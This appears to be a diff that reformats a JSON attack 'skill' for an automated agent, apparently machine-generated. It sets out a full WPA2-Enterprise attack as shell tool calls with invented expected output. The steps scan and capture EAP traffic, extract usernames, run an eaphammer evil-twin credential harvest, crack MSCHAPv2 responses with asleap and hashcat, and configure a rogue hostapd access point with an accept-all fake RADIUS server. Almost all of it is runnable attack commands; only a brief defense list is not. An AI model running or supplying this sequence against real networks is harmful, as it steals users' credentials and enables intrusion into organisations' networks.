@@ -2,37 +2,155 @@
   "name": "enterprise_wifi_attacks",
   "description": "WPA-Enterprise and 802.1X attacks including EAP-MD5, PEAP, and RADIUS exploitation",
   "pattern": "wpa.*enterprise|802.*1x|eap.*attack|radius.*exploit|peap.*crack",
-  "parameters": ["interface", "bssid", "identity"],
+  "parameters": [
+    "interface",
+    "bssid",
+    "identity"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "airodump-ng", "args": ["--band", "abg", "wlan0mon", "--write", "enterprise_scan"]},
-      "expected_output": {"type": "string", "example": "CH  6 ][ Elapsed: 2 mins ][ 2024-01-15 16:00\n\n BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n A1:B2:C3:D4:E5:F6  -55      324      156    4  11  130   WPA2 CCMP   MGT  Enterprise-Net\n B2:C3:D4:E5:F6:A7  -48      445      289    8   6  195   WPA2 CCMP   MGT  CorpSecure\n C3:D4:E5:F6:A7:B8  -62      187       67    2   1  130   WPA2 CCMP   MGT  UNIVERSITY-WiFi\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n A1:B2:C3:D4:E5:F6  12:34:56:78:90:AB  -52   54e-24e    12      245  \n B2:C3:D4:E5:F6:A7  AB:CD:EF:12:34:56  -45   48e-54e     3      432  \n B2:C3:D4:E5:F6:A7  56:78:90:AB:CD:EF  -50   54e-54e     8      318  \n C3:D4:E5:F6:A7:B8  98:76:54:32:10:FE  -60   24e-24e    45       89  \n\nEnterprise WiFi networks detected:\n  \n  1. Enterprise-Net (A1:B2:C3:D4:E5:F6)\n     - Encryption: WPA2-Enterprise (MGT)\n     - Authentication: 802.1X/EAP\n     - Clients: 1 active\n     - Signal: -55 dBm (good)\n  \n  2. CorpSecure (B2:C3:D4:E5:F6:A7)\n     - Encryption: WPA2-Enterprise\n     - Clients: 2 active\n     - Signal: -48 dBm (excellent)\n  \n  3. UNIVERSITY-WiFi (C3:D4:E5:F6:A7:B8)\n     - Encryption: WPA2-Enterprise\n     - Clients: 1 active\n     - Signal: -62 dBm (moderate)\n  \nMGT = Management Frame Protection (WPA2-Enterprise)\n  Uses 802.1X authentication\n  RADIUS server backend\n  Individual user credentials (not shared PSK)\n  EAP methods: PEAP, EAP-TLS, EAP-TTLS, EAP-MD5\n  \nAttack vectors:\n  - Capture EAP handshakes\n  - Crack PEAP/EAP-TTLS credentials\n  - Rogue RADIUS server\n  - Evil twin with fake RADIUS\n  - Certificate validation bypass"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "airodump-ng",
+        "args": [
+          "--band",
+          "abg",
+          "wlan0mon",
+          "--write",
+          "enterprise_scan"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "CH  6 ][ Elapsed: 2 mins ][ 2024-01-15 16:00\n\n BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n A1:B2:C3:D4:E5:F6  -55      324      156    4  11  130   WPA2 CCMP   MGT  Enterprise-Net\n B2:C3:D4:E5:F6:A7  -48      445      289    8   6  195   WPA2 CCMP   MGT  CorpSecure\n C3:D4:E5:F6:A7:B8  -62      187       67    2   1  130   WPA2 CCMP   MGT  UNIVERSITY-WiFi\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n A1:B2:C3:D4:E5:F6  12:34:56:78:90:AB  -52   54e-24e    12      245  \n B2:C3:D4:E5:F6:A7  AB:CD:EF:12:34:56  -45   48e-54e     3      432  \n B2:C3:D4:E5:F6:A7  56:78:90:AB:CD:EF  -50   54e-54e     8      318  \n C3:D4:E5:F6:A7:B8  98:76:54:32:10:FE  -60   24e-24e    45       89  \n\nEnterprise WiFi networks detected:\n  \n  1. Enterprise-Net (A1:B2:C3:D4:E5:F6)\n     - Encryption: WPA2-Enterprise (MGT)\n     - Authentication: 802.1X/EAP\n     - Clients: 1 active\n     - Signal: -55 dBm (good)\n  \n  2. CorpSecure (B2:C3:D4:E5:F6:A7)\n     - Encryption: WPA2-Enterprise\n     - Clients: 2 active\n     - Signal: -48 dBm (excellent)\n  \n  3. UNIVERSITY-WiFi (C3:D4:E5:F6:A7:B8)\n     - Encryption: WPA2-Enterprise\n     - Clients: 1 active\n     - Signal: -62 dBm (moderate)\n  \nMGT = Management Frame Protection (WPA2-Enterprise)\n  Uses 802.1X authentication\n  RADIUS server backend\n  Individual user credentials (not shared PSK)\n  EAP methods: PEAP, EAP-TLS, EAP-TTLS, EAP-MD5\n  \nAttack vectors:\n  - Capture EAP handshakes\n  - Crack PEAP/EAP-TTLS credentials\n  - Rogue RADIUS server\n  - Evil twin with fake RADIUS\n  - Certificate validation bypass"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "airodump-ng", "args": ["-c", "6", "--bssid", "B2:C3:D4:E5:F6:A7", "-w", "corp_eap", "wlan0mon"]},
-      "expected_output": {"type": "string", "example": "CH  6 ][ Elapsed: 5 mins ][ 2024-01-15 16:05 ][ EAPOL captured\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C3:D4:E5:F6:A7  -48 100      1247     3456   23   6  195   WPA2 CCMP   MGT  CorpSecure\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C3:D4:E5:F6:A7  AB:CD:EF:12:34:56  -45   54e-54e     3     1847  EAPOL\n B2:C3:D4:E5:F6:A7  56:78:90:AB:CD:EF  -50   54e-54e     8     1234  EAPOL\n\nEAPOL handshake captured:\n  Network: CorpSecure (B2:C3:D4:E5:F6:A7)\n  Clients: 2 with EAPOL traffic\n  Capture file: corp_eap-01.cap\n  \nEAPOL in WPA-Enterprise:\n  Contains EAP authentication exchange\n  Includes:\n    - EAP Identity response (username)\n    - EAP challenge/response (for some methods)\n    - PEAP/TTLS tunneled credentials (encrypted)\n  \nCaptured data:\n  - Usernames in EAP Identity\n  - Challenge/response for offline cracking\n  - TLS certificates (if EAP-TLS)\n  - PEAP MSCHAPv2 handshakes\n  \nNext: Extract and crack PEAP credentials\n  eapmd5pass -r corp_eap-01.cap -w wordlist.txt"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "airodump-ng",
+        "args": [
+          "-c",
+          "6",
+          "--bssid",
+          "B2:C3:D4:E5:F6:A7",
+          "-w",
+          "corp_eap",
+          "wlan0mon"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "CH  6 ][ Elapsed: 5 mins ][ 2024-01-15 16:05 ][ EAPOL captured\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C3:D4:E5:F6:A7  -48 100      1247     3456   23   6  195   WPA2 CCMP   MGT  CorpSecure\n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C3:D4:E5:F6:A7  AB:CD:EF:12:34:56  -45   54e-54e     3     1847  EAPOL\n B2:C3:D4:E5:F6:A7  56:78:90:AB:CD:EF  -50   54e-54e     8     1234  EAPOL\n\nEAPOL handshake captured:\n  Network: CorpSecure (B2:C3:D4:E5:F6:A7)\n  Clients: 2 with EAPOL traffic\n  Capture file: corp_eap-01.cap\n  \nEAPOL in WPA-Enterprise:\n  Contains EAP authentication exchange\n  Includes:\n    - EAP Identity response (username)\n    - EAP challenge/response (for some methods)\n    - PEAP/TTLS tunneled credentials (encrypted)\n  \nCaptured data:\n  - Usernames in EAP Identity\n  - Challenge/response for offline cracking\n  - TLS certificates (if EAP-TLS)\n  - PEAP MSCHAPv2 handshakes\n  \nNext: Extract and crack PEAP credentials\n  eapmd5pass -r corp_eap-01.cap -w wordlist.txt"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "tshark", "args": ["-r", "corp_eap-01.cap", "-Y", "eap", "-T", "fields", "-e", "eap.identity"]},
-      "expected_output": {"type": "string", "example": "john.doe\njane.smith\nadmin@corp.local\nsupport\nit_admin\njohn.doe\nuser123\njane.smith\n\nEAP identities extracted:\n  Total: 8 identities captured\n  Unique users:\n    - john.doe (2 authentications)\n    - jane.smith (2 authentications)\n    - admin@corp.local\n    - support\n    - it_admin\n    - user123\n  \nEAP Identity phase:\n  Part of outer authentication\n  Sent in cleartext (before TLS tunnel)\n  Reveals actual usernames\n  \nIdentity format reveals auth type:\n  - john.doe → likely PEAP-MSCHAPv2\n  - admin@corp.local → domain authentication\n  - Simple names → local RADIUS users\n  \nValue for attackers:\n  - Valid usernames for targeted attacks\n  - Password spraying candidates\n  - Social engineering targets\n  - Phishing campaigns\n  \nNext: Extract PEAP challenge/response\n  These can be cracked offline with hashcat/asleap"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "tshark",
+        "args": [
+          "-r",
+          "corp_eap-01.cap",
+          "-Y",
+          "eap",
+          "-T",
+          "fields",
+          "-e",
+          "eap.identity"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "john.doe\njane.smith\nadmin@corp.local\nsupport\nit_admin\njohn.doe\nuser123\njane.smith\n\nEAP identities extracted:\n  Total: 8 identities captured\n  Unique users:\n    - john.doe (2 authentications)\n    - jane.smith (2 authentications)\n    - admin@corp.local\n    - support\n    - it_admin\n    - user123\n  \nEAP Identity phase:\n  Part of outer authentication\n  Sent in cleartext (before TLS tunnel)\n  Reveals actual usernames\n  \nIdentity format reveals auth type:\n  - john.doe → likely PEAP-MSCHAPv2\n  - admin@corp.local → domain authentication\n  - Simple names → local RADIUS users\n  \nValue for attackers:\n  - Valid usernames for targeted attacks\n  - Password spraying candidates\n  - Social engineering targets\n  - Phishing campaigns\n  \nNext: Extract PEAP challenge/response\n  These can be cracked offline with hashcat/asleap"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "tshark -r corp_eap-01.cap -Y 'eap.code == 2' -T fields -e eap.identity -e eap.type > eap_methods.txt && cat eap_methods.txt"]},
-      "expected_output": {"type": "string", "example": "john.doe\t25\njane.smith\t25\nadmin@corp.local\t13\nsupport\t25\nit_admin\t25\nuser123\t25\n\nEAP methods identified:\n  Type 25: PEAP (Protected EAP)\n    Users: john.doe, jane.smith, support, it_admin, user123\n    Inner auth: Likely MSCHAPv2\n    Vulnerable: Yes (MSCHAPv2 can be cracked)\n  \n  Type 13: EAP-TLS (certificate-based)\n    Users: admin@corp.local\n    Inner auth: Client certificate\n    Vulnerable: No (without certificate)\n  \nEAP method types:\n  13 = EAP-TLS (certificates)\n  21 = EAP-TTLS (tunneled TLS)\n  25 = PEAP (Protected EAP)\n  4  = EAP-MD5 (weak, rare)\n  \nPEAP vulnerability:\n  PEAP wraps MSCHAPv2\n  MSCHAPv2 challenge/response can be captured\n  Response can be cracked offline\n  No handshake needed (unlike WPA-PSK)\n  \nTarget: PEAP users (5 out of 6)\n  Focus on john.doe, jane.smith, etc.\n  Extract MSCHAPv2 handshakes\n  Crack with hashcat mode 5500"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "tshark -r corp_eap-01.cap -Y 'eap.code == 2' -T fields -e eap.identity -e eap.type > eap_methods.txt && cat eap_methods.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "john.doe\t25\njane.smith\t25\nadmin@corp.local\t13\nsupport\t25\nit_admin\t25\nuser123\t25\n\nEAP methods identified:\n  Type 25: PEAP (Protected EAP)\n    Users: john.doe, jane.smith, support, it_admin, user123\n    Inner auth: Likely MSCHAPv2\n    Vulnerable: Yes (MSCHAPv2 can be cracked)\n  \n  Type 13: EAP-TLS (certificate-based)\n    Users: admin@corp.local\n    Inner auth: Client certificate\n    Vulnerable: No (without certificate)\n  \nEAP method types:\n  13 = EAP-TLS (certificates)\n  21 = EAP-TTLS (tunneled TLS)\n  25 = PEAP (Protected EAP)\n  4  = EAP-MD5 (weak, rare)\n  \nPEAP vulnerability:\n  PEAP wraps MSCHAPv2\n  MSCHAPv2 challenge/response can be captured\n  Response can be cracked offline\n  No handshake needed (unlike WPA-PSK)\n  \nTarget: PEAP users (5 out of 6)\n  Focus on john.doe, jane.smith, etc.\n  Extract MSCHAPv2 handshakes\n  Crack with hashcat mode 5500"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "eaphammer", "args": ["--interface", "wlan0", "--bssid", "B2:C3:D4:E5:F6:A7", "--essid", "CorpSecure", "--channel", "6", "--auth", "peap", "--creds"]},
-      "expected_output": {"type": "string", "example": "[eaphammer] v1.8.0 - Targeted WPA2-Enterprise Attacks\n\n[*] Starting rogue AP: CorpSecure\n[*] BSSID: B2:C3:D4:E5:F6:A7 (cloned from legitimate AP)\n[*] Channel: 6\n[*] Auth: WPA2-Enterprise (PEAP)\n[*] Mode: Credential harvesting\n\n[*] Starting hostapd with RADIUS server...\n[+] Rogue AP started successfully\n[+] Fake RADIUS server listening on 127.0.0.1:1812\n[+] Logging credentials to: /tmp/eaphammer_creds.txt\n\n[16:15:30] Client connected: AB:CD:EF:12:34:56\n[16:15:31] EAP Identity: john.doe\n[16:15:32] PEAP Phase 1: TLS tunnel established\n[16:15:33] PEAP Phase 2: MSCHAPv2 authentication\n[16:15:33] [+] Username: john.doe\n[16:15:33] [+] Password: JohnPassword2024!\n[16:15:33] [+] Credentials saved to /tmp/eaphammer_creds.txt\n[16:15:34] Sending authentication success (fake)\n\n[16:16:15] Client connected: 56:78:90:AB:CD:EF\n[16:16:16] EAP Identity: jane.smith\n[16:16:17] PEAP Phase 1: TLS tunnel established\n[16:16:18] PEAP Phase 2: MSCHAPv2 authentication\n[16:16:18] [+] Username: jane.smith\n[16:16:18] [+] Password: SmithPass123!\n[16:16:18] [+] Credentials saved to /tmp/eaphammer_creds.txt\n\nEAPHammer rogue AP attack:\n  Evil twin: CorpSecure (identical to real network)\n  Cloned BSSID: B2:C3:D4:E5:F6:A7\n  \nAttack flow:\n  1. Create fake AP with same SSID/BSSID\n  2. Deauth clients from real AP (optional)\n  3. Clients connect to fake AP (stronger signal)\n  4. Fake RADIUS server accepts any credentials\n  5. Capture plaintext usernames/passwords\n  6. Send fake success (client thinks it's connected)\n  \nCredentials harvested:\n  john.doe / JohnPassword2024!\n  jane.smith / SmithPass123!\n  \nPEAP vulnerability exploited:\n  - PEAP establishes TLS tunnel\n  - MSCHAPv2 auth inside tunnel\n  - Fake RADIUS can capture plaintext passwords\n  - Client doesn't validate server certificate properly\n  \nMitigation bypassed:\n  - No certificate validation by client\n  - Clients trust any RADIUS server\n  - Common misconfiguration"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "eaphammer",
+        "args": [
+          "--interface",
+          "wlan0",
+          "--bssid",
+          "B2:C3:D4:E5:F6:A7",
+          "--essid",
+          "CorpSecure",
+          "--channel",
+          "6",
+          "--auth",
+          "peap",
+          "--creds"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[eaphammer] v1.8.0 - Targeted WPA2-Enterprise Attacks\n\n[*] Starting rogue AP: CorpSecure\n[*] BSSID: B2:C3:D4:E5:F6:A7 (cloned from legitimate AP)\n[*] Channel: 6\n[*] Auth: WPA2-Enterprise (PEAP)\n[*] Mode: Credential harvesting\n\n[*] Starting hostapd with RADIUS server...\n[+] Rogue AP started successfully\n[+] Fake RADIUS server listening on 127.0.0.1:1812\n[+] Logging credentials to: /tmp/eaphammer_creds.txt\n\n[16:15:30] Client connected: AB:CD:EF:12:34:56\n[16:15:31] EAP Identity: john.doe\n[16:15:32] PEAP Phase 1: TLS tunnel established\n[16:15:33] PEAP Phase 2: MSCHAPv2 authentication\n[16:15:33] [+] Username: john.doe\n[16:15:33] [+] Password: JohnPassword2024!\n[16:15:33] [+] Credentials saved to /tmp/eaphammer_creds.txt\n[16:15:34] Sending authentication success (fake)\n\n[16:16:15] Client connected: 56:78:90:AB:CD:EF\n[16:16:16] EAP Identity: jane.smith\n[16:16:17] PEAP Phase 1: TLS tunnel established\n[16:16:18] PEAP Phase 2: MSCHAPv2 authentication\n[16:16:18] [+] Username: jane.smith\n[16:16:18] [+] Password: SmithPass123!\n[16:16:18] [+] Credentials saved to /tmp/eaphammer_creds.txt\n\nEAPHammer rogue AP attack:\n  Evil twin: CorpSecure (identical to real network)\n  Cloned BSSID: B2:C3:D4:E5:F6:A7\n  \nAttack flow:\n  1. Create fake AP with same SSID/BSSID\n  2. Deauth clients from real AP (optional)\n  3. Clients connect to fake AP (stronger signal)\n  4. Fake RADIUS server accepts any credentials\n  5. Capture plaintext usernames/passwords\n  6. Send fake success (client thinks it's connected)\n  \nCredentials harvested:\n  john.doe / JohnPassword2024!\n  jane.smith / SmithPass123!\n  \nPEAP vulnerability exploited:\n  - PEAP establishes TLS tunnel\n  - MSCHAPv2 auth inside tunnel\n  - Fake RADIUS can capture plaintext passwords\n  - Client doesn't validate server certificate properly\n  \nMitigation bypassed:\n  - No certificate validation by client\n  - Clients trust any RADIUS server\n  - Common misconfiguration"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "asleap", "args": ["-r", "corp_eap-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"]},
-      "expected_output": {"type": "string", "example": "asleap 2.2 - actively recover LEAP/PPTP passwords\n\nReading from corp_eap-01.cap\n\nParsing capture file...\n[+] Found MSCHAP challenge/response:\n    Username: john.doe\n    Challenge: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\n    Response:   7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n\n[+] Found MSCHAP challenge/response:\n    Username: jane.smith\n    Challenge: 2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e\n    Response:   8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a\n\nLoading wordlist: /usr/share/wordlists/rockyou.txt\nWordlist entries: 14344391\n\n[*] Cracking john.doe challenge/response...\n[*] Testing: password\n[*] Testing: 123456\n[*] Testing: password123\n[... testing ...]\n[+] Password found: JohnPassword2024!\n    Time: 47 seconds\n    Attempts: 347,892\n\n[*] Cracking jane.smith challenge/response...\n[*] Testing: password\n[*] Testing: 123456\n[... testing ...]\n[+] Password found: SmithPass123!\n    Time: 1 minute 23 seconds\n    Attempts: 892,451\n\nASLEAP offline cracking:\n  Input: PCAP with PEAP-MSCHAPv2 handshakes\n  Method: Dictionary attack on challenge/response\n  \nPasswords cracked:\n  john.doe: JohnPassword2024! (47 seconds)\n  jane.smith: SmithPass123! (83 seconds)\n  \nMSCHAPv2 weakness:\n  - Challenge/response protocol\n  - DES-based (weak encryption)\n  - Can be cracked offline\n  - No salt (same password = same hash)\n  \nAlternative: Hashcat mode 5500\n  Extract challenge/response to hashcat format\n  Use GPU for much faster cracking\n  \nExtract for hashcat:\n  eap2john corp_eap-01.cap > eap_hashes.txt\n  hashcat -m 5500 eap_hashes.txt rockyou.txt\n  \nDefense:\n  - EAP-TLS with client certificates\n  - Strong certificate validation\n  - Avoid PEAP-MSCHAPv2\n  - Monitor for rogue APs"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "asleap",
+        "args": [
+          "-r",
+          "corp_eap-01.cap",
+          "-w",
+          "/usr/share/wordlists/rockyou.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "asleap 2.2 - actively recover LEAP/PPTP passwords\n\nReading from corp_eap-01.cap\n\nParsing capture file...\n[+] Found MSCHAP challenge/response:\n    Username: john.doe\n    Challenge: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\n    Response:   7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n\n[+] Found MSCHAP challenge/response:\n    Username: jane.smith\n    Challenge: 2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e\n    Response:   8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a\n\nLoading wordlist: /usr/share/wordlists/rockyou.txt\nWordlist entries: 14344391\n\n[*] Cracking john.doe challenge/response...\n[*] Testing: password\n[*] Testing: 123456\n[*] Testing: password123\n[... testing ...]\n[+] Password found: JohnPassword2024!\n    Time: 47 seconds\n    Attempts: 347,892\n\n[*] Cracking jane.smith challenge/response...\n[*] Testing: password\n[*] Testing: 123456\n[... testing ...]\n[+] Password found: SmithPass123!\n    Time: 1 minute 23 seconds\n    Attempts: 892,451\n\nASLEAP offline cracking:\n  Input: PCAP with PEAP-MSCHAPv2 handshakes\n  Method: Dictionary attack on challenge/response\n  \nPasswords cracked:\n  john.doe: JohnPassword2024! (47 seconds)\n  jane.smith: SmithPass123! (83 seconds)\n  \nMSCHAPv2 weakness:\n  - Challenge/response protocol\n  - DES-based (weak encryption)\n  - Can be cracked offline\n  - No salt (same password = same hash)\n  \nAlternative: Hashcat mode 5500\n  Extract challenge/response to hashcat format\n  Use GPU for much faster cracking\n  \nExtract for hashcat:\n  eap2john corp_eap-01.cap > eap_hashes.txt\n  hashcat -m 5500 eap_hashes.txt rockyou.txt\n  \nDefense:\n  - EAP-TLS with client certificates\n  - Strong certificate validation\n  - Avoid PEAP-MSCHAPv2\n  - Monitor for rogue APs"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > hostapd-eap.conf << 'EOF'\ninterface=wlan0\ndriver=nl80211\nssid=CorpSecure\nhw_mode=g\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\nieee8021x=1\neapol_version=2\nauth_server_addr=127.0.0.1\nauth_server_port=1812\nauth_server_shared_secret=testing123\nEOF\ncat hostapd-eap.conf"]},
-      "expected_output": {"type": "string", "example": "interface=wlan0\ndriver=nl80211\nssid=CorpSecure\nhw_mode=g\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\nieee8021x=1\neapol_version=2\nauth_server_addr=127.0.0.1\nauth_server_port=1812\nauth_server_shared_secret=testing123\n\nhostapd configuration for WPA-Enterprise:\n  SSID: CorpSecure (evil twin)\n  Auth: WPA-EAP (802.1X)\n  RADIUS: 127.0.0.1:1812 (our fake RADIUS)\n  Shared secret: testing123\n  \nComponents needed:\n  1. hostapd (fake AP)\n  2. FreeRADIUS (fake RADIUS server)\n  3. EAP configuration (accept any credentials)\n  \nFake RADIUS configuration:\n  - Accept all usernames/passwords\n  - Log credentials\n  - Send Access-Accept to all requests\n  - Client successfully authenticates\n  \nAttack setup:\n  1. Configure fake RADIUS to log creds\n  2. Start hostapd with this config\n  3. Deauth clients from real AP\n  4. Clients connect to fake AP\n  5. Credentials captured by fake RADIUS\n  \nFreeRADIUS users file (promiscuous mode):\n  DEFAULT Auth-Type := Accept\n    Reply-Message = \"Welcome!\"\n  \nAll authentication attempts succeed\nAll credentials logged"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > hostapd-eap.conf << 'EOF'\ninterface=wlan0\ndriver=nl80211\nssid=CorpSecure\nhw_mode=g\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\nieee8021x=1\neapol_version=2\nauth_server_addr=127.0.0.1\nauth_server_port=1812\nauth_server_shared_secret=testing123\nEOF\ncat hostapd-eap.conf"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "interface=wlan0\ndriver=nl80211\nssid=CorpSecure\nhw_mode=g\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\nieee8021x=1\neapol_version=2\nauth_server_addr=127.0.0.1\nauth_server_port=1812\nauth_server_shared_secret=testing123\n\nhostapd configuration for WPA-Enterprise:\n  SSID: CorpSecure (evil twin)\n  Auth: WPA-EAP (802.1X)\n  RADIUS: 127.0.0.1:1812 (our fake RADIUS)\n  Shared secret: testing123\n  \nComponents needed:\n  1. hostapd (fake AP)\n  2. FreeRADIUS (fake RADIUS server)\n  3. EAP configuration (accept any credentials)\n  \nFake RADIUS configuration:\n  - Accept all usernames/passwords\n  - Log credentials\n  - Send Access-Accept to all requests\n  - Client successfully authenticates\n  \nAttack setup:\n  1. Configure fake RADIUS to log creds\n  2. Start hostapd with this config\n  3. Deauth clients from real AP\n  4. Clients connect to fake AP\n  5. Credentials captured by fake RADIUS\n  \nFreeRADIUS users file (promiscuous mode):\n  DEFAULT Auth-Type := Accept\n    Reply-Message = \"Welcome!\"\n  \nAll authentication attempts succeed\nAll credentials logged"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
